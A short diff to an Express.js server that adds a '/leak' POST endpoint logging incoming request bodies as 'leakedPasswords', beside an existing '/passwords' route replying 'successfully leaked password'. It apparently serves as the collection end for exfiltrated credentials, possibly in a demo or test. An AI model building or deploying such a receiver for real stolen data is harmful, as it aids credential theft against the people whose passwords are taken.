@@ -12,6 +12,12 @@ app.post("/passwords", (req, res) => {
     res.send("successfully leaked password")
 })
 
+app.post("/leak", (req, res) => {
+    const leakedPasswords = req.body
+    console.log(leakedPasswords)
+    res.send("Received leaked data")
+})
+
 const PORT = 8080
 export function start() {
     app.listen(PORT, () => {
